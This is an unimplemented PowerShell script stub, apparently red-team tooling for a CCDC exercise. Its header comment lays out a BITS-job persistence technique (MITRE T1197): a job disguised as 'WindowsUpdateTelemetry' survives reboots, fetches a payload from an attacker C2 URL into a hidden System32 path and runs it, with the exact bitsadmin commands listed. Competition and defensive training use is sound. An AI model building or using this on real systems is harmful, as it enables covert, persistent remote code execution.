#Requires -RunAsAdministrator
# ================================================================
# CCDC_Windows_BITS_BackgroundBeef.ps1
#
# Plan Reference: Phase_2_Tools/Scripts_Planning/Phase2_Scripts_Plan.md
#
# MITRE ATT&CK:   T1197 — BITS Jobs
# OS:             Windows Server 2022
# Run as:         Administrator (script itself exits immediately after setup)
#
# WHAT THIS SCRIPT WILL DO:
#   Registers a persistent Background Intelligent Transfer Service (BITS) job
#   that runs entirely in the background — this script runs, sets it up, and exits.
#   No resident PowerShell process remains:
#     - Creates a BITS job named "WindowsUpdateTelemetry" via bitsadmin or
#       Start-BitsTransfer -Asynchronous
#     - Job is set to RESUME_ON_RESTART so it survives reboots automatically
#     - On each trigger: downloads a payload from attacker C2 URL to a disguised
#       local path, then executes it via a BITS notification command
#     - Job priority: FOREGROUND for reliable execution during active sessions
#     - Notification command fires on job completion: executes the downloaded file
#   Unlike Phase 1's interactive loop, this uses the Windows BITS service itself
#   as the execution engine — zero PowerShell footprint after initial setup.
#
# IMPLEMENTATION NOTES:
#   - Create job: bitsadmin /create /download WindowsUpdateTelemetry
#   - Add file: bitsadmin /addfile <job> <remote-url> <local-dest>
#   - Set notification: bitsadmin /SetNotifyCmdLine <job> <cmd> <args>
#   - Set flags: bitsadmin /SetJobProperty <job> 4 1  (RESUME_ON_RESTART)
#   - Resume: bitsadmin /resume <job>
#   - C2_URL, LOCAL_PAYLOAD_PATH are configurable variables at top of script
#   - Disguise local payload path under C:\Windows\System32\spool\drivers\
#   - Optionally use Start-BitsTransfer -Source -Destination -Asynchronous -DisplayName
# ================================================================

# TODO: Implement this script
